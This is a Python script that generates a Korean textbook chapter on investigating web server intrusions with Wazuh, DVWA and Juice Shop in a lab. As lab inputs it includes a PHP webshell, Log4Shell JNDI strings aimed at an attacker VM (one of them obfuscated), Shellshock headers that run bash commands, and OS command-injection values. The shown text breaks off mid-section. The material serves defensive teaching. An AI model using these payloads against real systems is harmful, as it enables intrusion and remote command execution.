"""7장 신규 원고와 복사용 입력 생성. 네트워크 요청·실습 명령 실행 없음."""
from illustration_assets import resolve_path
import json
from pathlib import Path
ROOT=Path(__file__).resolve().parents[1]
pages=[]; commands=[]; queries=[]; inputs=[]
def p(text): return {'type':'p','text':text}
def h(text): return {'type':'h','text':text}
def code(text): return {'type':'code','text':text}
def tab(head,rows,widths): return {'type':'table','head':head,'rows':rows,'widths':widths}
def page(title,*blocks): pages.append({'title':title,'kind':'body','blocks':list(blocks)})
def fig(name,caption): return {'type':'image','path':'assets/figures/chapter07/'+name+'.png','caption':caption,'width_mm':127}
def sc(name,caption,width=127): return {'type':'image','path':'assets/screens/chapter07/'+name+'.png','caption':'화면 7-0. '+caption,'width_mm':width}
def spot(ch,name,caption): return {'type':'image','path':resolve_path('07',f'assets/illustrations/chapter{ch}/{name}.png'),'caption':'삽화. '+caption,'width_mm':55,'align':'right'}
def c(text,why,result,where='kt66-web · 컨테이너 셸'):
 b={'type':'command','id':f'C07-{len(commands)+1:02d}','where':where,'text':text,'why':why,'result':result};commands.append(b);return b
def q(text,why,result,index='wazuh-alerts-*'):
 b={'type':'query','id':f'Q07-{len(queries)+1:02d}','where':'Windows · Discover · '+index,'text':text,'why':why,'result':result};queries.append(b);return b
def bi(name,text,where='Windows · 브라우저 주소창'):
 inputs.append({'file':name+'.txt','text':text,'where':where});return code(text)
def ref(title,url): return {'type':'link','text':title,'url':url}

page('7장  웹 서버 침투와 실행 흔적',
 p('웹 폴더에 생긴 파일과 공격 문자열이 포함된 요청을 조사한다. 파일 생성, HTTP 응답, Wazuh 경보를 연결하고 서버에서 실제로 일어난 일을 판정한다. 6장의 웹 탐색·인증 조사에 이어 Module 01 실습 07~12를 다룬다.'),
 fig('roadmap','도식 7-1. 웹 침투 사례의 조사 대상'),
 p('사례마다 공격 준비와 입력 방법을 읽고 응답·로그를 대조한다. 마지막에는 확인한 사실, 추가 증거, 대응 조치를 적는다. 본문의 결과 화면은 2026년 10월 31일 강의 자료에 수록된 기록이다.'),
 p('관찰할 대상은 여섯 가지이다. 웹셸 파일, Log4Shell 조회 문자열, Shellshock 헤더, OS 명령 삽입, 의심 요청의 200 응답, 반복되는 서버 오류이다. 명령 실행과 데이터 노출은 각각의 결과 증거로 판단한다.'))
page('7.1  실습 주소와 준비 상태',
 p('kt66 VM에서 웹 서비스와 Wazuh가 실행 중이어야 한다. Windows 브라우저는 웹 입력과 Discover 검색에 사용한다. 공격자 VM은 선택 curl 실습에 사용하며 kt66 내부의 attacker 컨테이너와 구분한다.'),
 tab(['대상','본문의 주소','기존 화면의 주소'],[['kt66 VM','192.168.0.107','192.168.0.189'],['공격자 VM','192.168.0.108','192.168.0.202'],['웹 사이트','dvwa.ccc.com\njuice.ccc.com','동일한 사이트 이름'],['Wazuh','HTTPS · 포트 5601','화면의 날짜·시각 참조']],[30,49,48]),
 p('웹 사이트 이름은 Apache가 요청을 보낼 애플리케이션을 고르는 기준이다. 5장의 이름 등록 방법으로 Windows의 C:\\Windows\\System32\\drivers\\etc\\hosts를 열어 기존 항목부터 확인한다. 아래 이름의 이전 주소만 현재 kt66 주소로 바꾸고 저장한다.'),
 bi('B07-01-hosts','192.168.0.107 dvwa.ccc.com juice.ccc.com','Windows · hosts 파일'),
 p('브라우저에서 두 사이트의 첫 화면을 열어 DVWA 로그인 화면과 Juice Shop 화면을 확인한다. 앞 장에서 .kt66.lab 별칭을 사용했다면 서버에 등록된 이름과 일치하는지도 확인한다. IP 주소만으로 요청하면 기본 사이트가 선택될 수 있다.'))
page('7.1  로그인과 요청 관찰',
 p('① http://dvwa.ccc.com/login.php를 연다. 실습용 계정 admin과 password로 로그인한다. 초기 DB 준비 화면이 나타나는 새 환경에서만 5장의 Setup 절차로 Create / Reset Database를 누른다. 이미 준비된 DB는 로그인 상태와 정상 페이지부터 확인한다.'),
 p('② DVWA Security를 열고 시작 전 Security Level을 적는다. Low를 선택하고 Submit을 누른 다음 현재 단계가 Low인지 확인한다. 명령 삽입 사례에서는 Command Injection 메뉴로 들어간다.'),
 p('③ Ctrl+Shift+I로 개발자 도구를 열고 Network를 선택한다. Preserve log와 Disable cache를 켠다. Preserve log는 이동 전 요청을 남기고 Disable cache는 개발자 도구가 열린 동안 캐시 사용을 억제한다. 요청마다 시각·메서드·URL을 적는다.'),
 p('④ 요청 행의 Headers에서 Status Code와 Location을 읽고 Response에서 본문을 확인한다. 302는 다른 주소로 이동시키는 응답이다. 로그인 페이지로의 이동과 애플리케이션 처리 결과를 구분한다.'),
 p('⑤ https://192.168.0.107:5601에서 Wazuh에 로그인한다. 데모 계정은 admin / SecretPassword이며 변경한 환경에서는 해당 계정을 쓴다. web 에이전트가 연결됐는지 확인한다.'),
 h('완료 기준과 실패 시 확인'),
 p('두 웹 사이트의 정상 화면, DVWA의 Low 표시, web 연결 상태가 준비 기준이다. 화면이 다르면 사이트 이름과 hosts 주소, kt66 기동 상태, 로그인·DB 준비 상태 순서로 확인한다.'))
page('7.1  요청과 수집 경로',
 fig('collection','도식 7-2. 웹 요청·파일 변경과 Wazuh 수집 경로'),
 p('Apache 접속 로그에는 요청 줄과 응답 코드, Referer, User-Agent가 남는다. 웹 애플리케이션 방화벽인 WAF는 ModSecurity 감사 로그에 검사 내용과 처리 결과를 기록한다. FIM(파일 무결성 감시)은 지정 경로의 파일 변화를 보고한다. [2][3]'),
 tab(['기록','실행 위치와 경로'],[['DVWA · Juice 접속','kt66-web\n/var/log/apache2/dvwa_access.log\n/var/log/apache2/juice_access.log'],['IP 주소 접속','kt66-web\n/var/log/apache2/landing_access.log'],['WAF 감사 기록','kt66-web\n/var/log/apache2/modsec_audit.log'],['FIM 감시 설정','kt66-web\n/var/ossec/etc/ossec.conf']],[35,92]))
page('7.1  Discover에서 한 건 읽기',
 p('① ☰ 메뉴에서 Explore → Discover를 연다. 인덱스 패턴은 wazuh-alerts-*를 선택한다. 실습 직후에는 Last 15 minutes를, 기존 기록을 볼 때는 2026-10-31을 포함하는 절대 기간을 지정한다.'),
 p('② 검색창에 각 절의 DQL을 입력하고 Enter를 누른다. DQL은 저장된 문서를 조건으로 고르는 검색식이다. AND는 모든 조건, OR는 하나 이상의 조건, 괄호는 조건 묶음, 별표(*)는 여러 문자를 대신한다.'),
 p('③ 결과 행 왼쪽 >를 누르고 Table을 연다. 아래 필드를 찾아 원문과 연결한다. 필요한 필드의 추가 버튼으로 결과 표의 열에 넣는다.'),
 tab(['필드','원문과의 연결'],[['agent.name','수집 에이전트 이름. 요청 출발지와 다르다.'],['data.srcip','접속 로그 첫 부분의 출발지 IP. 프록시가 있으면 기록 정책도 확인한다.'],['data.protocol · data.url','요청 줄의 메서드와 URL.'],['data.id','요청 줄 뒤의 HTTP 상태 코드.'],['full_log · location','원문 전체와 수집 로그 파일 경로.'],['rule.id','원문을 분석한 Wazuh 규칙 번호.'],['syscheck.path','FIM이 관찰한 파일의 전체 경로.']],[44,83]),
 p('기존 화면의 출발지 .202와 새 요청의 .108을 섞어 검색하지 않는다. 기존 데이터가 없는 환경에서는 본문의 기록으로 분석하고, 직접 만든 기록은 자신의 시각·주소로 조회한다.'))
page('7.1  경보가 없을 때 원문 확인',
 p('경보 인덱스에는 경보 조건을 만족한 이벤트가 저장된다. wazuh-archives-*는 전체 이벤트 저장과 전송이 설정된 환경에서 사용한다. 경보 0건을 요청 0건으로 해석하기 전에 원본 로그를 확인한다. [4]'),
 c('docker exec -it kt66-web /bin/bash','docker exec는 실행 중인 컨테이너에서 프로그램을 시작한다. -i는 입력을 유지하고 -t는 터미널을 할당한다. /bin/bash는 대화형 셸이다.','kt66-web 안의 셸이 열린다. Docker 권한 오류가 나면 1장의 그룹·로그인 상태를 확인한다.','kt66 VM · 호스트 터미널'),
 c('tail -n 20 /var/log/apache2/dvwa_access.log','tail은 파일 끝부분을 읽는다. -n 20은 마지막 20줄을 출력한다. Juice 요청은 파일명을 juice_access.log로 바꿔 읽는다.','요청 시각·URL·응답을 확인한다. 다른 요청이 많으면 20을 늘리거나 7.8의 검색을 사용한다.'),
 c('exit','exit는 현재 셸을 종료한다.','kt66 VM의 호스트 터미널로 돌아간다.'),
 p('원문에도 없으면 요청 대상·Network 기록부터 확인한다. 원문에만 있으면 web 연결 상태와 수집 경로, 인덱스·기간을 확인한다. 아카이브가 없다면 3장의 저장·인덱스 준비 상태를 먼저 점검한다.'))
page('7.2  웹셸 파일과 요청',
 p('조사 대상은 웹 폴더에 추가된 shell.php이다. 웹셸은 웹 요청으로 서버의 기능이나 운영체제 명령을 실행하도록 만든 스크립트이다. 업로드 취약점으로 저장된 파일이 실행 가능한 경로에 놓이면 서버 명령 실행으로 이어질 수 있다.'),
 fig('webshell','도식 7-3. 파일 생성과 요청·실행 증거의 연결'),
 p('슬라이드의 실습은 관리자가 kt66-web 안에 PHP 파일을 직접 만들어 업로드된 상태를 재현한다. HTTP 업로드 성공을 검사한 과정은 아니다. FIM(File Integrity Monitoring)은 지정 경로의 파일 추가·변경·삭제를 탐지한다.'),
 p('선행 조건은 kt66-web의 /var/www 감시와 web 에이전트 연결이다. kt66-web은 Apache·WAF를 맡고 DVWA는 별도 컨테이너에서 실행한다. web의 파일 감시가 DVWA의 파일까지 자동으로 포함하는 것은 아니다.'),
 p('성공 기준은 실습 파일의 추가 경보와 그 파일을 요청한 접속 기록을 연결하는 것이다. 스크립트 실행 여부는 URL 연결 경로와 응답·실행 기록으로 따로 판정한다.'))
page('7.2  감시 경로와 생성 전 확인',
 c('docker exec -it kt66-web /bin/bash','kt66 호스트에서 web 컨테이너의 대화형 셸을 연다.','다음 명령은 kt66-web 안에서 실행한다.','kt66 VM · 호스트 터미널'),
 c("grep -n -F '/var/www' /var/ossec/etc/ossec.conf",'grep은 파일에서 조건에 맞는 줄을 찾는다. -n은 줄 번호, -F는 정규표현식 대신 문자 그대로 검색한다. 작은따옴표는 검색 문자열을 한 인자로 묶는다.','/var/www를 포함한 directories 항목과 realtime="yes"를 확인한다. 없으면 파일 생성 전에 수집 준비를 점검한다.'),
 c('ls -ld /var/www/html/uploads','ls는 파일·폴더 정보를 표시한다. -l은 상세 정보, -d는 폴더 내용 대신 폴더 자체를 표시한다.','폴더 존재 여부를 적는다. 없을 때만 mkdir -p /var/www/html/uploads로 만들고 같은 ls로 다시 확인한다.'),
 p('mkdir는 폴더를 만드는 도구이다. -p는 필요한 상위 폴더도 만들고 이미 있는 폴더는 유지한다. 새로 만든 폴더는 원상복구 때 빈 상태인지 확인한 뒤 제거한다.'))
page('7.2  웹셸 코드 저장',
 c('ls -l /var/www/html/uploads/book07-shell.php','이번 실습 파일이 이미 있는지 확인한다.','No such file or directory일 때 새 파일을 만든다. 이미 있으면 덮어쓰지 말고 다른 파일명을 정해 이후 입력에도 동일하게 쓴다.'),
 c('vim /var/www/html/uploads/book07-shell.php','Vim은 텍스트 편집기이다. kt66-web에 준비된 편집기로 PHP 코드를 저장한다. i를 누르고 아래 내용을 입력한 뒤 Esc, :wq, Enter 순서로 저장한다.','w는 저장, q는 종료이다. 취소할 때는 Esc, :q!, Enter를 사용한다.'),
 bi('F07-webshell',"<?php\nif (isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n",'kt66-web · Vim 파일 내용'),
 p('PHP는 서버에서 처리하는 스크립트 언어이다. $_GET은 URL 쿼리의 값을 읽고 isset은 cmd 값이 있는지 확인한다. system은 받은 값을 운영체제 명령으로 실행한다. 중괄호 { } 안은 조건이 참일 때 수행한다. 작은따옴표와 달러 기호($)까지 그대로 저장한다.'))
page('7.2  파일 확인과 웹 요청',
 c('cat /var/www/html/uploads/book07-shell.php','cat은 파일 내용을 출력한다. 저장한 코드와 앞의 예제를 대조한다.','$_GET과 따옴표가 그대로 있어야 한다. 셸의 변수 치환으로 내용이 달라지지 않았는지 확인한다.'),
 c('exit','컨테이너 셸을 종료한다.','kt66 호스트로 돌아간다.'),
 p('Windows 브라우저의 Network를 열고 다음 URL을 한 번 요청한다. 물음표(?) 뒤는 쿼리이며 cmd=id는 cmd라는 이름에 id라는 값을 전달한다. id는 실행 계정·그룹 식별자를 출력하는 명령이다.'),
 bi('B07-02-webshell','http://192.168.0.107/uploads/book07-shell.php?cmd=id'),
 p('Status Code와 Response를 함께 적는다. 슬라이드의 shell.php 요청은 404와 Not Found 본문을 반환했다. 파일을 만든 /var/www/html과 IP 요청의 기본 사이트 루트 /var/www/landing은 서로 다른 경로이다. PHP 실행기의 유무에 앞서 URL과 파일의 연결부터 확인한다.'),
 sc('file-response','shell.php 요청의 404 응답 본문'))
page('7.2  FIM 경보와 요청 검색',
 q('agent.name: "web" AND rule.id: "554"\nAND syscheck.path: *shell.php','554는 파일 추가 규칙이다. 별표로 시작하는 경로 조건은 shell.php로 끝나는 파일을 찾는다.','기존 shell.php와 실습 book07-shell.php를 전체 경로로 구분하고 시각을 적는다.'),
 sc('fim-event','web 에이전트의 파일 추가 경보'),
 sc('fim-path','FIM에 기록된 PHP 파일 경로'),
 p('rule.id 554와 syscheck.path /var/www/html/uploads/shell.php를 함께 읽는다. 파일 생성 시각은 19:14:05.794로 표시된다. 이 이벤트에는 HTTP 업로드 요청이나 명령 출력이 포함돼 있지 않다. [3]'),
 q('agent.name: "web"\nAND data.url: *book07-shell.php*','파일 요청은 접속 로그의 URL 조건으로 따로 찾는다. 기존 사례는 파일명을 shell.php로 바꾼다.','FIM 경로와 URL을 시각으로 연결한다. 요청이 없으면 landing_access.log를 확인한다.'))
page('7.2  웹셸 조사와 대응',
 p('파일 경로만으로 작성 주체를 알 수는 없다. 파일의 내용·소유자·권한·해시와 업로드·관리자 접속·배포 기록을 같은 시간대로 대조한다. 해시는 파일 내용의 비교값이며 변경 여부를 비교하는 데 쓴다.'),
 p('실제 사고에서는 파일과 로그를 보존한 뒤 해당 URL 접근을 제한하고 관련 서버의 범위를 조사한다. 업로드 폴더의 스크립트 실행을 차단하고, 허용 확장자·내용 검사를 적용하며, 가능하면 업로드 파일을 웹 루트 밖에 저장한다. [5]'),
 p('원본 슬라이드에는 VirusTotal 규칙 87105도 언급된다. 이 규칙은 연동 결과이고 554는 FIM 파일 추가이다. 별도 연동과 조회 결과가 있어야 하므로 FIM 경보만으로 악성 엔진의 탐지 수를 적지 않는다. 해당 연동은 이 권의 실습 범위 밖이다.'),
 h('결과가 다를 때'),
 p('FIM이 없으면 파일 존재, 감시 경로·초기 스캔, web 연결, 검색 기간 순서로 확인한다. 404이면 URL의 사이트 루트를 확인한다. 200이어도 PHP 소스가 내려온 것인지 명령 출력인지 본문을 구분한다.'),
 spot('04','field-check','파일 변경과 서버 기록 비교'))
page('7.2  실습 파일 원상복구',
 c('docker exec -it kt66-web /bin/bash','실습 파일을 정리할 컨테이너로 들어간다.','이후 파일 확인·삭제는 kt66-web에서 한다.','kt66 VM · 호스트 터미널'),
 c('cat /var/www/html/uploads/book07-shell.php','삭제 전에 이번에 작성한 내용인지 읽는다.','다른 파일이면 중단하고 생성 때 사용한 경로를 확인한다.'),
 c('rm -i /var/www/html/uploads/book07-shell.php','rm은 파일을 삭제하며 -i는 삭제 전에 확인한다.','확인창의 경로가 맞으면 y를 입력한다. 이어 ls -l /var/www/html/uploads/book07-shell.php에서 파일이 없음을 확인한다.'),
 p('이번에 uploads 폴더를 만들었다면 ls -la /var/www/html/uploads로 숨김 항목까지 확인한다. -a는 점(.)으로 시작하는 이름도 표시한다. .과 .. 외에 내용이 없을 때만 rmdir /var/www/html/uploads로 빈 폴더를 제거한다. rmdir는 비어 있는 폴더만 지운다. ls -ld로 제거 결과를 확인한다.'),
 c('exit','web 컨테이너 셸을 종료한다.','호스트로 돌아간다. Discover에서 앞의 FIM 식을 rule.id: "553"으로 바꾸면 삭제 경보도 조사할 수 있다.'))

page('7.3  Log4Shell의 조회 문자열',
 p('조사 대상은 URL과 User-Agent에 들어 있는 JNDI 조회 문자열이다. Log4Shell(CVE-2021-44228)은 Java의 로그 라이브러리 Log4j 2에서 외부 입력을 처리하다 원격 코드 실행으로 이어질 수 있는 취약점이다. 취약한 버전과 입력 처리 경로가 있어야 성립한다. [6]'),
 p('JNDI는 Java에서 이름으로 자원 등을 조회하는 인터페이스이다. LDAP는 디렉터리 조회 프로토콜이며 아래 문자열은 LDAP 서버의 자원 a를 지정한다. 서버가 이 주소를 실제로 조회했는지는 통신 기록으로 확인한다.'),
 code('${jndi:ldap://192.168.0.108:1389/a}'),
 fig('log4shell','도식 7-4. 입력 문자열의 처리와 외부 조회'),
 p('달러 기호와 중괄호로 둘러싼 ${…}는 조회 표현식 형태이다. ldap 뒤의 주소는 조회 목적지, 1389는 포트, /a는 자원 이름이다. HTTP 요청 출발지와 조회 목적지는 다른 역할이며 서로 다른 주소일 수 있다.'),
 p('이 사례의 목표는 요청 문자열과 응답·로그의 대응을 찾는 것이다. DVWA는 PHP 애플리케이션이므로 접속 로그의 문자열만으로 Log4j 실행을 입증할 수 없다. 슬라이드에는 외부 LDAP 서비스 준비나 Java 코드 실행 결과가 없다.'))

page('7.3  브라우저 헤더와 URL 입력',
 p('선행 조건은 7.1의 주소 등록과 DVWA 접근이다. User-Agent는 요청 도구의 종류를 알리는 헤더이며 요청자가 바꿀 수 있다. 개발자 도구의 ⋮ 메뉴에서 More tools → Network conditions를 연다. User agent의 Use browser default를 해제하고 Custom 입력란에 아래 값을 넣는다.'),
 bi('B07-03-jndi-agent','${jndi:ldap://192.168.0.108:1389/a}','Windows · Network conditions · User-Agent'),
 p('개발자 도구를 열어 둔 채 아래 주소를 한 번 요청한다. q는 URL 쿼리의 이름이다. URL 인코딩은 문자를 %와 두 자리 16진수로 표시하는 방법이며 %24는 $, %7B는 {, %7D는 }, %3A는 :, %2F는 /이다.'),
 bi('B07-04-jndi-url','http://dvwa.ccc.com/?q=%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.108%3A1389%2Fa%7D'),
 p('Network의 Request Headers에서 User-Agent를, Request URL에서 q 값을 확인한다. 두 위치에 같은 조회 주소를 넣었는지 비교하고 응답 코드와 본문을 기록한다. 슬라이드의 첫 요청은 403이었다.'),
 h('원상복구'),
 p('요청을 마치면 Use browser default를 켠다. 정상 페이지를 다시 열고 User-Agent가 기본 브라우저 값인지 확인한다. 이 입력만으로 LDAP 서버가 만들어지거나 취약한 Java 환경이 준비되지는 않는다.'))

page('7.3  원문에서 입력 찾기',
 sc('log4-rule','JNDI 문자열 요청에 적용된 웹 오류 규칙'),
 sc('log4-raw','URL과 User-Agent의 JNDI 문자열'),
 p('rule.id 31101은 4xx 응답을 분류한다. full_log의 요청 줄 뒤에는 403이 있고 끝부분의 User-Agent에는 조회 문자열이 남아 있다. URL의 인코딩된 값과 헤더의 평문 값을 서로 대응시킨다.'),
 q('agent.name: "web"\nAND (full_log: *jndi* OR data.url: *jndi*)','원문 또는 URL에 jndi가 포함된 문서를 찾는다. OR를 괄호로 묶어 web 조건이 양쪽에 적용되게 한다.','시각·출발지·응답과 조회 목적지를 적는다. 이 식은 jndi 글자가 분리된 변형을 모두 찾지는 못한다.'),
 p('403만으로 차단 주체를 확정하지 않는다. 같은 시각·출발지·URL의 WAF 감사 기록에서 탐지 메시지와 처리 결과를 확인한다. 원본 기록에 보이는 .202는 본문 예시의 .108과 역할이 같은 주소이다.'))

page('7.3  변형과 수집의 빈틈',
 p('슬라이드의 두 번째 요청은 X-Api-Version 헤더에 조회 문자열을 나누어 넣고 User-Agent에는 RMI 조회 문자열을 넣었다. RMI는 Java 프로그램 사이의 원격 호출에 쓰는 방식이다. 이 헤더 변형은 7.9의 선택 curl 예제에서 읽는다.'),
 code('${${lower:j}ndi:ldap://192.168.0.108:1389/b}'),
 p('안쪽 ${lower:j}를 해석하면 j가 되어 바깥 표현식의 jndi가 구성된다. 원문에는 연속된 jndi가 없으므로 그 글자만 검색하면 놓칠 수 있다. 닫는 중괄호는 안쪽과 바깥쪽에 각각 필요하다.'),
 q('agent.name: "web"\nAND (full_log: *jndi* OR full_log: *lower*\n     OR data.url: *%24%7B*)','jndi, lower 또는 URL에 인코딩된 ${ 형태로 후보를 넓힌다. 이는 의심 입력의 후보 검색이며 정상 문자열도 포함될 수 있다.','원문을 펼쳐 전체 표현식을 읽는다. 인코딩 대소문자·다른 변형·수집하지 않는 헤더에는 별도 확인이 필요하다.','wazuh-archives-*'),
 p('기본 combined 접속 로그는 User-Agent와 Referer를 기록하지만 X-Api-Version 같은 임의 헤더는 보통 기록하지 않는다. WAF가 그 요청을 감사 대상으로 저장했는지 확인한다. 새 헤더가 보이지 않는 이유를 공격이 없었다는 판단으로 바꾸지 않는다. [2]'),
 p('슬라이드 변형 요청의 응답은 302이다. Location·본문과 외부 통신을 추가 확인해야 한다. Wazuh에 없으면 원본 access·감사 기록, 수집 설정, 인덱스·기간 순서로 확인한다.'))

page('7.3  외부 조회 조사와 대응',
 p('먼저 대상 서비스의 Java 사용 여부와 Log4j 구성·버전을 확인한다. HTTP 요청을 받은 앞단과 실제로 로그를 처리하는 뒷단이 다른 경우에는 각 서비스의 입력 전달 경로를 따라간다.'),
 tab(['확인 대상','증거와 다음 판단'],[['요청 문자열','접속·WAF 원문에서 입력 위치와 조회 주소를 확보한다.'],['외부 조회','방화벽·DNS·애플리케이션 기록으로 서버가 해당 주소에 통신했는지 확인한다.'],['명령 실행','Java의 하위 프로세스, 새 파일, 후속 통신과 응답 내용을 대조한다.'],['영향 범위','같은 구성의 서비스와 동일 목적지로 나간 다른 서버를 조사한다.']],[31,96]),
 p('대응은 영향을 받는 Log4j 구성의 수정과 업데이트가 우선이다. Apache의 보안 공지에서 해당 Java 계열에 맞는 수정 버전을 확인한다. 슬라이드의 “2.17 이상”을 모든 취약점과 환경에 대한 고정 완료 기준으로 쓰지 않는다. [6]'),
 p('업무에 필요 없는 외부 LDAP·RMI 통신을 제한하고 이미 발생한 조회 기록을 보존한다. 외부 연결이 보이면 목적지·시각·프로세스를 연결해 실행 여부를 조사한다. 요청의 403과 뒷단의 외부 통신은 각각 확인한다.'),
 p('완료 기록에는 “조회 문자열 요청과 403을 확인했다”처럼 관찰한 사실을 먼저 쓴다. Java 구성·외부 조회·실행 기록이 확보되면 그 근거를 추가한다.'))

page('7.4  Shellshock과 환경변수',
 p('조사 대상은 요청 헤더의 () { :; }; 구문이다. Bash는 운영체제 명령을 해석하는 셸이다. Shellshock은 취약한 Bash가 환경변수의 함수 정의를 읽을 때 뒤따르는 명령까지 실행할 수 있었던 취약점이다. [7]'),
 p('환경변수는 프로그램에 설정을 전달하는 이름과 값이다. CGI는 웹 서버가 외부 프로그램을 호출해 응답을 만드는 방식이다. CGI를 통해 User-Agent가 HTTP_USER_AGENT 환경변수로 전달될 수 있다.'),
 fig('shellshock','도식 7-5. 헤더·CGI 환경변수·Bash의 연결'),
 p('성립 조건은 외부 헤더 값 전달, Bash 호출, 취약한 Bash이다. URL에 /cgi-bin/이 있다는 사실만으로 CGI가 존재하거나 Bash가 실행됐다고 판단할 수는 없다.'),
 p('성공 기준은 두 헤더의 공격 구문과 HTTP 응답·Wazuh 규칙을 연결하는 것이다. 선행 조건은 Juice와 DVWA 정상 접속이다. 실제 Bash 실행 여부는 별도 서버 기록으로 판정한다.'))

page('7.4  User-Agent에 공격 구문 입력',
 p('Windows 브라우저에서 Network conditions를 열고 Use browser default를 해제한다. User-Agent를 다음 값으로 바꾼다.'),
 bi('B07-05-shellshock-agent','() { :; }; /bin/bash -c "id"','Windows · Network conditions · User-Agent'),
 p('소괄호 ()와 중괄호 { }는 함수 형태를 이룬다. 콜론(:)은 아무 동작도 하지 않는 셸 명령이고 세미콜론(;)은 명령을 구분한다. /bin/bash -c "id"는 뒤 문자열 id를 Bash 명령으로 해석하도록 시도한다.'),
 p('개발자 도구를 열어 둔 채 아래 주소를 한 번 요청한다. Request Headers에서 바뀐 헤더를 확인하고 Status Code·Response를 기록한다.'),
 bi('B07-06-shellshock-url','http://juice.ccc.com/cgi-bin/test.cgi'),
 p('슬라이드는 이 요청에 200을 기록했다. 일반 웹앱의 시작 페이지가 반환된 경우와 명령 출력이 반환된 경우를 본문으로 구분한다. 응답 크기만으로 id 실행을 판단하지 않는다.'),
 h('원상복구'),
 p('Use browser default를 켜고 정상 요청의 헤더를 확인한다. Referer 헤더를 사용한 두 번째 공격 입력은 7.9의 curl 예제에 있다. 브라우저 User-Agent 변경과 Referer 변경은 서로 다른 요청이다.'))

page('7.4  두 헤더와 응답 대조',
 sc('shell-rules','Shellshock 형태의 요청에 적용된 두 규칙'),
 sc('shell-raw','User-Agent와 Referer에 기록된 공격 구문'),
 p('위 행은 /cgi-bin/test.cgi 요청의 200과 규칙 31168, 아래 행은 /cgi-bin/status 요청의 403과 규칙 31166이다. 출발지는 .202이며 원문 시각은 17:20:55 +0900이다.'),
 p('combined 형식에서 요청 줄 뒤에는 상태·응답 바이트 수, Referer, User-Agent 순서로 값이 온다. 위 행은 마지막 헤더에 /bin/bash -c "id"가, 아래 행은 그 앞 헤더에 /bin/bash -c "cat /etc/passwd"가 있다. [2]'),
 p('cat은 파일 내용을 출력한다. /etc/passwd는 계정 정보 파일로, 그 파일을 읽으려는 요청 구문이 관찰된 것이다. 이 원문은 서버가 실제 파일을 읽었다는 실행 기록과 구분한다.'))

page('7.4  Shellshock 규칙 검색',
 q('agent.name: "web"\nAND (rule.id: (31166 OR 31167 OR 31168 OR 31169)\n     OR rule.description: *Shellshock*)','네 규칙 번호 또는 Shellshock을 포함한 설명으로 검색한다. rule.description의 대소문자와 전체 값을 결과에서 확인한다.','메서드·경로·응답과 공격 구문을 원문에서 대조한다.'),
 tab(['Wazuh 4.10 규칙','상위 조건과 의미'],[['31166 · 31167','31101 또는 31120과 헤더 구문 일치. 31101은 4xx, 31120은 50으로 시작하는 오류를 분류한다.'],['31168 · 31169','31108과 헤더 구문 일치. 31108은 2xx·3xx의 단순 요청 분류이다.']],[38,89]),
 p('31168의 설명에는 detected가 들어 있지만 웹 접속 로그의 조건으로 분류한 결과이다. CGI·Bash 프로세스를 직접 관찰한 규칙이 아니다. 7.8에서 Manager의 규칙 파일과 상위 규칙을 확인한다. [8]'),
 h('대응과 실패 시 확인'),
 p('실제 조사에서는 CGI 경로·실행 설정, Bash 패치 상태, 웹 서버 하위 프로세스와 파일·통신 변화를 확인한다. 불필요한 CGI를 제한하고 해당 운영체제의 Bash 보안 업데이트를 적용한다. [7]'),
 p('경보가 없으면 실제 전송 헤더, access 원문, 수집·기간 순서로 확인한다. 정상 페이지가 200으로 열렸다면 그 결과를 기록하고 명령 실행 증거를 추가로 찾는다.'))

page('7.5  OS 명령 삽입의 입력 경로',
 p('조사 대상은 IP 주소 입력값에 붙은 셸 명령이다. OS 명령 삽입은 외부 입력이 셸 명령의 일부로 해석돼 의도하지 않은 명령이 실행되는 문제이다. DVWA의 Command Injection은 입력 주소로 ping을 실행한다.'),
 p('ping은 대상의 네트워크 응답을 확인하는 도구이다. Low 처리 코드는 입력을 ping 명령 문자열에 이어 붙인다. 세미콜론 등 셸 기호가 전달되면 추가 명령으로 해석될 수 있다.'),
 fig('command-input','도식 7-6. 웹 입력과 운영체제 명령 처리'),
 tab(['기호','셸에서의 동작'],[['세미콜론(;)','앞 명령 뒤에 다음 명령을 실행한다.'],['파이프(|)','앞 명령의 출력을 다음 명령의 입력으로 보낸다.'],['&& · ||','앞 명령 성공 시 실행 · 실패 시 실행.'],['$(명령) · 역따옴표(`)','명령 출력으로 해당 부분을 치환한다.']],[43,84]),
 p('URL에서 기호를 발견한 단계와 애플리케이션이 셸에 전달한 단계를 구분한다. WAF가 앞에서 요청을 차단하면 입력이 애플리케이션까지 도달하지 않을 수 있다.'))

page('7.5  정상 입력과 POST 공격 입력',
 p('선행 조건은 DVWA 로그인과 Low 단계이다. Windows 브라우저에서 Command Injection을 연다. Network를 켠 상태에서 주소 입력란에 127.0.0.1을 넣고 Submit을 누른다. 이 주소는 애플리케이션이 실행되는 시스템 자신을 가리킨다.'),
 p('정상 입력의 ping 출력·응답 상태를 먼저 기록한다. 다음으로 입력란을 아래 값으로 바꾸고 Submit을 한 번 누른다.'),
 bi('B07-07-command-form','127.0.0.1; id','Windows · DVWA Command Injection · 주소 입력란'),
 p('세미콜론 뒤의 id가 추가 명령이다. Network에서 POST 요청을 선택하고 Payload의 Form Data를 읽는다. ip 값과 Submit 값이 함께 전달됐는지 확인한다.'),
 p('Response와 페이지의 출력을 읽는다. uid·gid가 출력되면 계정 식별 명령의 실행 근거로 조사한다. 403이면 같은 요청의 WAF 감사 기록을 읽는다. 302이면 Location을 따라 로그인 상태부터 확인한다.'),
 p('성공 기준은 정상 입력과 공격 입력의 메서드·본문·응답을 구분하고 로그와 연결하는 것이다. 응답이 없으면 정상 ping 결과, 로그인·Low, 전송된 Form Data, WAF 순서로 확인한다.'),
 h('원상복구'),
 p('입력란을 비우고 DVWA Security를 시작 전 값으로 돌려 Submit을 누른다. 현재 단계 표시를 확인한다. 추가 파일을 만드는 명령은 이 사례에 포함돼 있지 않다.'))

page('7.5  GET 요청 두 가지 비교',
 p('슬라이드의 첫 GET은 Juice 주문 추적 경로에 ;id를 붙인 요청이다. Windows 브라우저에서 아래 주소를 한 번 요청하고 경로·상태·본문을 적는다. %3B는 세미콜론이다.'),
 bi('B07-08-command-juice','http://juice.ccc.com/rest/track-order/1%3Bid'),
 p('기존 결과는 200이다. 주문 식별자로 받은 문자열인지 실제로 셸에 전달한 값인지 애플리케이션의 처리와 본문으로 구분해야 한다. 정상 응답 코드는 명령 실행의 증거가 아니다.'),
 p('두 번째 GET은 DVWA의 ip 쿼리에 파일 읽기 명령을 붙인다. %7C는 파이프, %20은 공백이다.'),
